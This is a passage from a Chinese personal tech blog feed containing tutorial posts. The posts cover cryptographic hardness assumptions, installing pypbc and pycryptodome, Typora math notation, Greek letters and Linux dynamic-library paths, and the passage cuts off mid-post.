        <content type="html"><![CDATA[<h1 id="密码学中的困难问题详解"><a href="#密码学中的困难问题详解" class="headerlink" title="密码学中的困难问题详解"></a>密码学中的困难问题详解</h1><p>密码学中的困难问题详解，密码学的安全性依赖于一些数学上已知的困难问题。这些问题被认为在经典计算机或量子计算机上都难以高效解决。以下是密码学中重要的困难问题分类及详解。</p><hr><h2 id="一、离散对数类问题"><a href="#一、离散对数类问题" class="headerlink" title="一、离散对数类问题"></a>一、离散对数类问题</h2><h3 id="1-离散对数问题-Discrete-Logarithm-Problem-DLP"><a href="#1-离散对数问题-Discrete-Logarithm-Problem-DLP" class="headerlink" title="1. 离散对数问题 (Discrete Logarithm Problem, DLP)"></a>1. 离散对数问题 (Discrete Logarithm Problem, DLP)</h3><p>描述为：<br>给定素数 $p$、生成元 $g$ 和 $h$，求 $x$，使得  $h = g^x \ (\text{mod } p)$</p><p>该问题是 Diffie-Hellman 密钥交换和 ElGamal 加密算法的基础。</p><h3 id="2-椭圆曲线离散对数问题-Elliptic-Curve-Discrete-Logarithm-Problem-ECDLP"><a href="#2-椭圆曲线离散对数问题-Elliptic-Curve-Discrete-Logarithm-Problem-ECDLP" class="headerlink" title="2. 椭圆曲线离散对数问题 (Elliptic Curve Discrete Logarithm Problem, ECDLP)"></a>2. 椭圆曲线离散对数问题 (Elliptic Curve Discrete Logarithm Problem, ECDLP)</h3><p>描述为：<br>在椭圆曲线群 $E(F_p)$ 上，给定点 $P$ 和 $Q$，求标量 $k$，使得  $Q = kP$</p><p>ECDLP 是椭圆曲线密码（如 ECDH 和 ECDSA）的核心难题。</p><hr><h2 id="二、Diffie-Hellman-类问题"><a href="#二、Diffie-Hellman-类问题" class="headerlink" title="二、Diffie-Hellman 类问题"></a>二、Diffie-Hellman 类问题</h2><h3 id="1-计算性-Diffie-Hellman-问题-Computational-Diffie-Hellman-Problem-CDH"><a href="#1-计算性-Diffie-Hellman-问题-Computational-Diffie-Hellman-Problem-CDH" class="headerlink" title="1. 计算性 Diffie-Hellman 问题 (Computational Diffie-Hellman Problem, CDH)"></a>1. 计算性 Diffie-Hellman 问题 (Computational Diffie-Hellman Problem, CDH)</h3><p>描述为：<br>给定 $g^a$ 和 $g^b$ （模 $p$），计算 $g^{ab}$。<br>CDH 是构造许多密码协议的基础。</p><h3 id="2-决定性-Diffie-Hellman-问题-Decisional-Diffie-Hellman-Problem-DDH"><a href="#2-决定性-Diffie-Hellman-问题-Decisional-Diffie-Hellman-Problem-DDH" class="headerlink" title="2. 决定性 Diffie-Hellman 问题 (Decisional Diffie-Hellman Problem, DDH)"></a>2. 决定性 Diffie-Hellman 问题 (Decisional Diffie-Hellman Problem, DDH)</h3><p>描述为：<br>给定 $g^a$、$g^b$ 和 $g^c$ （模 $p$），判断 $g^c$ 是否等于 $g^{ab}$。<br>DDH 通常用于构造安全多方计算和伪随机数生成器。</p><h3 id="3-广义-Diffie-Hellman-问题-Generalized-Diffie-Hellman-Problem-GDH"><a href="#3-广义-Diffie-Hellman-问题-Generalized-Diffie-Hellman-Problem-GDH" class="headerlink" title="3. 广义 Diffie-Hellman 问题 (Generalized Diffie-Hellman Problem, GDH)"></a>3. 广义 Diffie-Hellman 问题 (Generalized Diffie-Hellman Problem, GDH)</h3><p>描述为：<br>在群 $G$ 中，给定 $g, g^{x_1}, g^{x_2}, \dots, g^{x_k}$，计算 $g^{x_1x_2\dots x_k}$。</p><hr><h2 id="三、双线性映射相关问题"><a href="#三、双线性映射相关问题" class="headerlink" title="三、双线性映射相关问题"></a>三、双线性映射相关问题</h2><h3 id="1-双线性-Diffie-Hellman-问题-Bilinear-Diffie-Hellman-Problem-BDH"><a href="#1-双线性-Diffie-Hellman-问题-Bilinear-Diffie-Hellman-Problem-BDH" class="headerlink" title="1. 双线性 Diffie-Hellman 问题 (Bilinear Diffie-Hellman Problem, BDH)"></a>1. 双线性 Diffie-Hellman 问题 (Bilinear Diffie-Hellman Problem, BDH)</h3><p>在双线性映射 $e: G_1 \times G_1 \to G_2$ 中，给定 $g, g^a, g^b, g^c \in G_1$，计算  $e(g, g)^{abc}$</p><p>这是基于双线性对的密码算法（如配对加密）的基础。</p><h3 id="2-决定性双线性-Diffie-Hellman-问题-Decisional-Bilinear-Diffie-Hellman-Problem-DBDH"><a href="#2-决定性双线性-Diffie-Hellman-问题-Decisional-Bilinear-Diffie-Hellman-Problem-DBDH" class="headerlink" title="2. 决定性双线性 Diffie-Hellman 问题 (Decisional Bilinear Diffie-Hellman Problem, DBDH)"></a>2. 决定性双线性 Diffie-Hellman 问题 (Decisional Bilinear Diffie-Hellman Problem, DBDH)</h3><p>在双线性映射 $e: G_1 \times G_1 \to G_2$ 中，给定 $g, g^a, g^b, g^c \in G_1$ 和 $T \in G_2$，判断 $T = e(g, g)^{abc}$ 是否成立。</p><h3 id="3-广义双线性-Diffie-Hellman-问题-Generalized-Bilinear-Diffie-Hellman-Problem-GBDH"><a href="#3-广义双线性-Diffie-Hellman-问题-Generalized-Bilinear-Diffie-Hellman-Problem-GBDH" class="headerlink" title="3. 广义双线性 Diffie-Hellman 问题 (Generalized Bilinear Diffie-Hellman Problem, GBDH)"></a>3. 广义双线性 Diffie-Hellman 问题 (Generalized Bilinear Diffie-Hellman Problem, GBDH)</h3><p>GBDH 是 BDH 的推广，允许更多参与者和复杂场景。</p><hr><h2 id="四、因子分解类问题"><a href="#四、因子分解类问题" class="headerlink" title="四、因子分解类问题"></a>四、因子分解类问题</h2><h3 id="1-整数分解问题-Integer-Factorization-Problem-IFP"><a href="#1-整数分解问题-Integer-Factorization-Problem-IFP" class="headerlink" title="1. 整数分解问题 (Integer Factorization Problem, IFP)"></a>1. 整数分解问题 (Integer Factorization Problem, IFP)</h3><p>描述为：<br>给定一个整数 $n = p \cdot q$，其中 $p$ 和 $q$ 是大素数，求出 $p$ 和 $q$。<br>IFP 是 RSA 和许多公钥密码系统的核心难题。</p><h3 id="2-积性同余子群问题"><a href="#2-积性同余子群问题" class="headerlink" title="2. 积性同余子群问题"></a>2. 积性同余子群问题</h3><p>描述为：<br>在模 $n$ 的群中，给定生成元 $g$ 和目标值 $h$，计算 $x$，使得  $h = g^x \ (\text{mod } n)$</p><p>这也是基于整数因子分解的密码系统的难题。</p><hr><h2 id="五、格密码相关问题"><a href="#五、格密码相关问题" class="headerlink" title="五、格密码相关问题"></a>五、格密码相关问题</h2><h3 id="1-最短向量问题-Shortest-Vector-Problem-SVP"><a href="#1-最短向量问题-Shortest-Vector-Problem-SVP" class="headerlink" title="1. 最短向量问题 (Shortest Vector Problem, SVP)"></a>1. 最短向量问题 (Shortest Vector Problem, SVP)</h3><p>描述为：<br>在格 $L$ 中，找到长度最短的非零向量 $\mathbf{v}$，使得 $\mathbf{v} \in L$。<br>SVP 是基于格密码（如 NTRU 和 LWE）的核心难题。</p><h3 id="2-最近向量问题-Closest-Vector-Problem-CVP"><a href="#2-最近向量问题-Closest-Vector-Problem-CVP" class="headerlink" title="2. 最近向量问题 (Closest Vector Problem, CVP)"></a>2. 最近向量问题 (Closest Vector Problem, CVP)</h3><p>描述为：<br>在格 $L$ 中，给定任意点 $\mathbf{t}$，找到格中距离 $\mathbf{t}$ 最近的点。</p><h3 id="3-学习带误差问题-Learning-with-Errors-LWE"><a href="#3-学习带误差问题-Learning-with-Errors-LWE" class="headerlink" title="3. 学习带误差问题 (Learning with Errors, LWE)"></a>3. 学习带误差问题 (Learning with Errors, LWE)</h3><p>描述为：<br>给定一组方程 $Ax + e = b$，其中 $A$ 是已知矩阵，$e$ 是小噪声，求未知的 $x$。<br>LWE 是后量子密码学的重要基础。</p><hr><h2 id="六、后量子密码相关问题"><a href="#六、后量子密码相关问题" class="headerlink" title="六、后量子密码相关问题"></a>六、后量子密码相关问题</h2><h3 id="1-代码破解问题-Code-based-Problem"><a href="#1-代码破解问题-Code-based-Problem" class="headerlink" title="1. 代码破解问题 (Code-based Problem)"></a>1. 代码破解问题 (Code-based Problem)</h3><p>描述为：<br>在随机线性码中，给定生成矩阵 $G$ 和加密后的数据，恢复原始消息。<br>这是基于纠错码密码系统（如 McEliece 和 Niederreiter）的核心难题。</p><h3 id="2-同源性问题-Isogeny-Problem"><a href="#2-同源性问题-Isogeny-Problem" class="headerlink" title="2. 同源性问题 (Isogeny Problem)"></a>2. 同源性问题 (Isogeny Problem)</h3><p>描述为：<br>在椭圆曲线同源图中，找到从曲线 $E_1$ 到 $E_2$ 的同源映射。<br>这是基于同源密码的核心问题。</p><hr><h2 id="七、困难问题间的关系"><a href="#七、困难问题间的关系" class="headerlink" title="七、困难问题间的关系"></a>七、困难问题间的关系</h2><p>许多困难问题之间具有复杂的数学关系：</p><ol><li><strong>DLP</strong> 是 <strong>CDH</strong> 的基础，<strong>CDH</strong> 是 <strong>DDH</strong> 的前提条件。</li><li><strong>ECDLP</strong> 是 DLP 的椭圆曲线版本，但安全性更高。</li><li><strong>LWE</strong> 和 <strong>SVP</strong> 是格密码中相互关联的问题。</li><li><strong>IFP</strong> 和 <strong>DLP</strong> 是经典密码的两个主要难题。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python安装pypbc</title>
      <link href="/2024/11/27/an-zhuang-pypbc/"/>
      <url>/2024/11/27/an-zhuang-pypbc/</url>
      
        <content type="html"><![CDATA[<h1 id="python安装pypbc"><a href="#python安装pypbc" class="headerlink" title="python安装pypbc"></a>python安装pypbc</h1><p>python安装pypbc</p><p>首先我是ubuntu22环境，python版本为3.10</p><p>去<a href="https://github.com/debatem1/pypbc">pypbc</a>把代码全部下载，进去目录<code>pypbc</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> pypbcpip <span class="token function">install</span> <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>多版本使用对应的pip安装即可，执行完就晚装完成了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip list <span class="token operator">|</span> <span class="token function">grep</span> pypbc  <span class="token comment"># 验证安装</span>pypbc               <span class="token number">0.2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typora数学符号</title>
      <link href="/2024/11/27/typora-shu-xue-fu-hao/"/>
      <url>/2024/11/27/typora-shu-xue-fu-hao/</url>
      
        <content type="html"><![CDATA[<h1 id="typora数学符号"><a href="#typora数学符号" class="headerlink" title="typora数学符号"></a>typora数学符号</h1><p>Typora 是一个支持 LaTeX 数学公式的优秀 Markdown 编辑器，可以直接编写数学公式并实时渲染。以下是如何在 Typora 中使用数学公式的详细指南：</p><hr><h2 id="1-启用数学公式支持"><a href="#1-启用数学公式支持" class="headerlink" title="1. 启用数学公式支持"></a>1. <strong>启用数学公式支持</strong></h2><p>默认情况下，Typora 支持 LaTeX 格式的数学公式，无需额外设置。如果未生效，请确保已启用数学渲染：</p><ol><li>打开 Typora。</li><li>点击顶部菜单栏的 <strong>File &gt; Preferences（设置）</strong>。</li><li>在设置中，选择 <strong>Markdown</strong> 选项卡。</li><li>确保勾选了 <strong>Enable MathJax</strong> 或 <strong>Enable Katex</strong>，以支持数学公式渲染。</li></ol><hr><h2 id="2-数学公式语法"><a href="#2-数学公式语法" class="headerlink" title="2. 数学公式语法"></a>2. <strong>数学公式语法</strong></h2><h3 id="2-1-行内公式"><a href="#2-1-行内公式" class="headerlink" title="2.1 行内公式"></a>2.1 行内公式</h3><p>在段落中插入公式，使用单个 <code>$</code> 包裹公式内容：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">行内公式示例：$E = mc^2$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>渲染效果： 行内公式示例：$E = mc^2$</p><hr><h3 id="2-2-独立公式"><a href="#2-2-独立公式" class="headerlink" title="2.2 独立公式"></a>2.2 独立公式</h3><p>单独显示的数学公式，使用双 <code>$</code> 或 <code>$$</code> 包裹公式内容：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">独立公式示例：$$\int_a^b f(x)dx = F(b) - F(a)$$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>渲染效果：<br>$$<br>\int_a^b f(x)dx = F(b) - F(a)<br>$$</p><hr><h2 id="3-复杂数学公式"><a href="#3-复杂数学公式" class="headerlink" title="3. 复杂数学公式"></a>3. <strong>复杂数学公式</strong></h2><h3 id="示例-1：矩阵"><a href="#示例-1：矩阵" class="headerlink" title="示例 1：矩阵"></a>示例 1：矩阵</h3><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">矩阵：$$\mathbf{A} = \begin{bmatrix}1 &amp; 2 &amp; 3 \\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\end{bmatrix}$$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>渲染效果：<br>$$<br>\mathbf{A} = \begin{bmatrix}<br>1 &amp; 2 &amp; 3 \<br>4 &amp; 5 &amp; 6 \<br>7 &amp; 8 &amp; 9<br>\end{bmatrix}<br>$$</p><hr><h3 id="示例-2：分数和开方"><a href="#示例-2：分数和开方" class="headerlink" title="示例 2：分数和开方"></a>示例 2：分数和开方</h3><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">分数与开方：$$x = \frac{-b \pm \sqrt{b^2 - 4ac}}{2a}$$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>渲染效果：<br>$$<br>x = \frac{-b \pm \sqrt{b^2 - 4ac}}{2a}<br>$$</p><hr><h3 id="示例-3：求和与极限"><a href="#示例-3：求和与极限" class="headerlink" title="示例 3：求和与极限"></a>示例 3：求和与极限</h3><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">求和与极限：$$\sum_{i=1}^n i = \frac{n(n+1)}{2}, \quad \lim_{x \to \infty} \frac{1}{x} = 0$$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>渲染效果：<br>$$<br>\sum_{i=1}^n i = \frac{n(n+1)}{2}, \quad \lim_{x \to \infty} \frac{1}{x} = 0<br>$$</p><hr><h3 id="示例-4：多行公式对齐"><a href="#示例-4：多行公式对齐" class="headerlink" title="示例 4：多行公式对齐"></a>示例 4：多行公式对齐</h3><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">多行公式对齐：$$\begin{aligned}y &amp;= mx + b \\f(x) &amp;= x^2 + 2x + 1\end{aligned}$$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>渲染效果：<br>$$<br>\begin{aligned}<br>y &amp;= mx + b \<br>f(x) &amp;= x^2 + 2x + 1<br>\end{aligned}<br>$$</p><hr><h2 id="4-快捷键"><a href="#4-快捷键" class="headerlink" title="4. 快捷键"></a>4. <strong>快捷键</strong></h2><ul><li>使用 <strong><code>Ctrl + T</code></strong> 或 <strong><code>Command + T</code></strong> 可以快速切换公式预览。</li><li>如果希望查看公式源代码，按下 <strong><code>Ctrl + /</code></strong> 或 **<code>Command + /</code>**。</li></ul><hr><p>在 Typora 中，如果需要数学公式与文字紧密排列在一起，可以使用 <strong>行内公式</strong> 格式。具体方法如下：</p><p>偏好设置-&gt;markdown-&gt;勾选内联公式</p><hr><h2 id="1-使用-实现行内公式"><a href="#1-使用-实现行内公式" class="headerlink" title="1. 使用 $...$ 实现行内公式"></a><strong>1. 使用 <code>$...$</code> 实现行内公式</strong></h2><p>行内公式会随着文字的排版而排列，可以直接插入到文字之间。例如：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">爱因斯坦的质能方程为 $E=mc^2$，这是能量和质量关系的基础公式。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="渲染效果："><a href="#渲染效果：" class="headerlink" title="渲染效果："></a>渲染效果：</h3><p>爱因斯坦的质能方程为 $E=mc^2$，这是能量和质量关系的基础公式。</p><hr><h2 id="2-注意空格与对齐问题"><a href="#2-注意空格与对齐问题" class="headerlink" title="2. 注意空格与对齐问题"></a><strong>2. 注意空格与对齐问题</strong></h2><h3 id="示例-1：在公式与文字之间增加适当的空格"><a href="#示例-1：在公式与文字之间增加适当的空格" class="headerlink" title="示例 1：在公式与文字之间增加适当的空格"></a>示例 1：在公式与文字之间增加适当的空格</h3><p>当公式两侧紧挨中文字符时，可能需要手动添加空格，以确保渲染结果美观：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">质量 $m$ 和能量 $E$ 之间的关系为 $E = mc^2$。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="渲染效果：-1"><a href="#渲染效果：-1" class="headerlink" title="渲染效果："></a>渲染效果：</h3><p>质量 $m$ 和能量 $E$ 之间的关系为 $E = mc^2$。</p><hr><h3 id="示例-2：纯英文情况下，公式无需额外空格"><a href="#示例-2：纯英文情况下，公式无需额外空格" class="headerlink" title="示例 2：纯英文情况下，公式无需额外空格"></a>示例 2：纯英文情况下，公式无需额外空格</h3><p>在纯英文环境中，公式通常与文字自然对齐，无需调整：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">The equation $E=mc^2$ explains the relationship between energy and mass.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="渲染效果：-2"><a href="#渲染效果：-2" class="headerlink" title="渲染效果："></a>渲染效果：</h3><p>The equation $E=mc^2$ explains the relationship between energy and mass.</p><hr><h2 id="3-混合行内和块级公式"><a href="#3-混合行内和块级公式" class="headerlink" title="3. 混合行内和块级公式"></a><strong>3. 混合行内和块级公式</strong></h2><p>如果需要同时包含行内和块级公式，可以灵活使用：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">爱因斯坦提出了著名的公式 $E = mc^2$，用于描述能量和质量的关系。更详细的表达形式为：$$E = \int_a^b f(x) dx$$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="渲染效果：-3"><a href="#渲染效果：-3" class="headerlink" title="渲染效果："></a>渲染效果：</h3><p>爱因斯坦提出了著名的公式 $E = mc^2$，用于描述能量和质量的关系。</p><p>更详细的表达形式为：<br>$$<br>E = \int_a^b f(x) dx<br>$$</p><hr><h2 id="4-Typora-自动调整换行"><a href="#4-Typora-自动调整换行" class="headerlink" title="4. Typora 自动调整换行"></a><strong>4. Typora 自动调整换行</strong></h2><p>如果文字较多且公式插入后自动换行，可以通过调整文字排版来控制公式位置。例如：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">为了进一步验证公式 $E=mc^2$ 的正确性，我们需要对其进行理论推导，涉及到积分与导数等高等数学内容。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="渲染效果：-4"><a href="#渲染效果：-4" class="headerlink" title="渲染效果："></a>渲染效果：</h3><p>为了进一步验证公式 $E=mc^2$ 的正确性，我们需要对其进行理论推导，涉及到积分与导数等高等数学内容。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>希腊字母</title>
      <link href="/2024/11/25/xi-la-zi-mu/"/>
      <url>/2024/11/25/xi-la-zi-mu/</url>
      
        <content type="html"><![CDATA[<h1 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h1><p>以下是数学和科学中常用的 <strong>希腊字母</strong> 及其用途的对照表，包括大写和小写形式：</p><table><thead><tr><th>序号</th><th><strong>字母</strong></th><th><strong>名称</strong></th><th><strong>发音（英文）</strong></th><th><strong>数学与科学用途</strong></th></tr></thead><tbody><tr><td>1</td><td>Αα</td><td>Alpha</td><td>ˈælfə</td><td>表示角度、系数、角速度等</td></tr><tr><td>2</td><td>Ββ</td><td>Beta</td><td>ˈbeɪtə 或 ˈbiːtə</td><td>表示系数、β辐射、概率密度函数中的参数等</td></tr><tr><td>3</td><td>Γγ</td><td>Gamma</td><td>ˈɡæmə</td><td>表示伽马函数、光谱系数、第三角速度等</td></tr><tr><td>4</td><td>Δδ</td><td>Delta</td><td>ˈdɛltə</td><td>表示变化量、偏导数（小写 δ）、有限差分等</td></tr><tr><td>5</td><td>Εε</td><td>Epsilon</td><td>ˈɛpsɪlɒn</td><td>表示小量、误差、介电常数等</td></tr><tr><td>6</td><td>Ζζ</td><td>Zeta</td><td>ˈzeɪtə</td><td>表示黎曼ζ函数、阻尼系数等</td></tr><tr><td>7</td><td>Ηη</td><td>Eta</td><td>ˈiːtə 或 ˈeɪtə</td><td>表示效率、黏滞系数等</td></tr><tr><td>8</td><td>Θθ</td><td>Theta</td><td>ˈθeɪtə</td><td>表示角度、温度、周期等</td></tr><tr><td>9</td><td>Ιι</td><td>Iota</td><td>aɪˈoʊtə</td><td>很少用于数学，通常表示极小值</td></tr><tr><td>10</td><td>Κκ</td><td>Kappa</td><td>ˈkæpə</td><td>表示曲率、波数、热导率等</td></tr><tr><td>11</td><td>Λλ</td><td>Lambda</td><td>ˈlæmdə</td><td>表示波长、特征值、线性密度等</td></tr><tr><td>12</td><td>Μμ</td><td>Mu</td><td>mjuː</td><td>表示摩擦系数、磁导率、平均值等</td></tr><tr><td>13</td><td>Νν</td><td>Nu</td><td>njuː</td><td>表示频率、泊松比等</td></tr><tr><td>14</td><td>Ξξ</td><td>Xi</td><td>zaɪ 或 ksiː</td><td>表示随机变量、配分函数等</td></tr><tr><td>15</td><td>Οο</td><td>Omicron</td><td>ˈɒmɪkrɒn</td><td>很少用于数学与科学</td></tr><tr><td>16</td><td>Ππ</td><td>Pi</td><td>paɪ</td><td>表示圆周率（π\piπ）、乘积符号（∏\prod∏）等</td></tr><tr><td>17</td><td>Ρρ</td><td>Rho</td><td>roʊ</td><td>表示密度、电阻率等</td></tr><tr><td>18</td><td>Σσ/ς</td><td>Sigma</td><td>ˈsɪɡmə</td><td>表示求和符号（∑\sum∑）、标准差等</td></tr><tr><td>19</td><td>Ττ</td><td>Tau</td><td>taʊ</td><td>表示时间常数、剪切应力等</td></tr><tr><td>20</td><td>Υυ</td><td>Upsilon</td><td>ˈʌpsɪlɒn 或 ˈjuːpsɪlɒn</td><td>很少用于数学，偶用于表示介质传播系数</td></tr><tr><td>21</td><td>Φφ</td><td>Phi</td><td>faɪ 或 fiː</td><td>表示黄金比例、角度、磁通量等</td></tr><tr><td>22</td><td>Χχ</td><td>Chi</td><td>kaɪ</td><td>表示卡方分布、特征函数等</td></tr><tr><td>23</td><td>Ψψ</td><td>Psi</td><td>saɪ</td><td>表示波函数、状态函数等</td></tr><tr><td>24</td><td>Ωω</td><td>Omega</td><td>ˈoʊmɪɡə 或 oʊˈmeɪɡə</td><td>表示欧姆（电阻单位）、角速度、复数平面中的极限等</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python报错ModuleNotFoundError:No-module-named-Crypto.Cipher</title>
      <link href="/2024/11/25/modulenotfounderror-no-module-named-crypto.cipher/"/>
      <url>/2024/11/25/modulenotfounderror-no-module-named-crypto.cipher/</url>
      
        <content type="html"><![CDATA[<h1 id="Python报错ModuleNotFoundError-No-module-named-‘Crypto-Cipher’"><a href="#Python报错ModuleNotFoundError-No-module-named-‘Crypto-Cipher’" class="headerlink" title="Python报错ModuleNotFoundError: No module named ‘Crypto.Cipher’"></a>Python报错ModuleNotFoundError: No module named ‘Crypto.Cipher’</h1><p>这个报错通常是因为 Python 中的 <code>Crypto.Cipher</code> 模块不可用，可能是没有正确安装相关库或者使用了错误的模块路径。</p><p>在 Python 中，如果要使用加密相关功能，可以安装并使用 <strong>PyCryptodome</strong>，这是一个常用的加密库。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h4 id="1-安装-pycryptodome"><a href="#1-安装-pycryptodome" class="headerlink" title="1. 安装 pycryptodome"></a>1. 安装 <code>pycryptodome</code></h4><p>运行以下命令来安装正确的库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> pycryptodome<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-检查安装版本是否正确"><a href="#2-检查安装版本是否正确" class="headerlink" title="2. 检查安装版本是否正确"></a>2. 检查安装版本是否正确</h4><p>确保安装成功，并查看库版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip show pycryptodome<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出应类似于：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Name: pycryptodomeVersion: <span class="token number">3</span>.x.xLocation: /path/to/python/site-packages<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-如果问题仍存在"><a href="#3-如果问题仍存在" class="headerlink" title="3. 如果问题仍存在"></a>3. 如果问题仍存在</h4><ul><li><p>环境问题：确认是否安装在正确的 Python 环境中。你可以通过以下命令检查：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">which</span> python<span class="token function">which</span> pip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>模块冲突：如果已经安装了一个名为 crypto的库（旧版本或其他库），可能会导致冲突。尝试卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall crypto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><p>以下是一个使用 <code>PyCryptodome</code> 的简单示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> get_random_bytes<span class="token comment"># 生成随机密钥</span>key <span class="token operator">=</span> get_random_bytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_EAX<span class="token punctuation">)</span><span class="token comment"># 加密数据</span>plaintext <span class="token operator">=</span> <span class="token string">b'This is a secret message.'</span>nonce <span class="token operator">=</span> cipher<span class="token punctuation">.</span>nonceciphertext<span class="token punctuation">,</span> tag <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt_and_digest<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Ciphertext:"</span><span class="token punctuation">,</span> ciphertext<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态链接库</title>
      <link href="/2024/11/24/dong-tai-lian-jie-ku/"/>
      <url>/2024/11/24/dong-tai-lian-jie-ku/</url>
      
        <content type="html"><![CDATA[<h1 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h1><hr><h3 id="一、-etc-ld-so-conf-d-的作用"><a href="#一、-etc-ld-so-conf-d-的作用" class="headerlink" title="一、/etc/ld.so.conf.d 的作用"></a><strong>一、<code>/etc/ld.so.conf.d</code> 的作用</strong></h3><ul><li><strong>动态库路径管理</strong>：系统会读取该目录下的 <code>.conf</code> 文件，这些文件指定了动态链接库的额外搜索路径。</li><li><strong>配置动态库缓存</strong>：在运行程序时，动态链接器会从这些路径中查找所需的库。</li></ul><p><strong>默认加载的路径</strong>（视系统配置而定）：</p><ol><li><code>/lib</code></li><li><code>/usr/lib</code></li><li><code>/usr/local/lib</code></li></ol><p>通过 <code>/etc/ld.so.conf.d</code>，可以扩展默认路径。</p><hr><h3 id="二、动态库的加载顺序"><a href="#二、动态库的加载顺序" class="headerlink" title="二、动态库的加载顺序"></a><strong>二、动态库的加载顺序</strong></h3><p>动态链接器按照以下顺序查找动态库：</p><ol><li><strong>环境变量</strong>：<code>LD_LIBRARY_PATH</code>。</li><li><strong>缓存文件</strong>：<code>/etc/ld.so.cache</code>。</li><li><strong>默认路径</strong>：如 <code>/lib</code> 和 <code>/usr/lib</code>。</li></ol><p><strong>注意</strong>：为了提高效率，系统不会直接读取所有路径，而是从 <code>/etc/ld.so.cache</code> 中加载已经缓存的路径信息。</p><hr><h3 id="三、-etc-ld-so-conf-d-的文件结构"><a href="#三、-etc-ld-so-conf-d-的文件结构" class="headerlink" title="三、/etc/ld.so.conf.d 的文件结构"></a><strong>三、<code>/etc/ld.so.conf.d</code> 的文件结构</strong></h3><p>该目录包含多个 <code>.conf</code> 文件，每个文件可以指定一组路径。例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看 /etc/ld.so.conf.d 内容</span><span class="token function">ls</span> /etc/ld.so.conf.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出示例：</p><pre 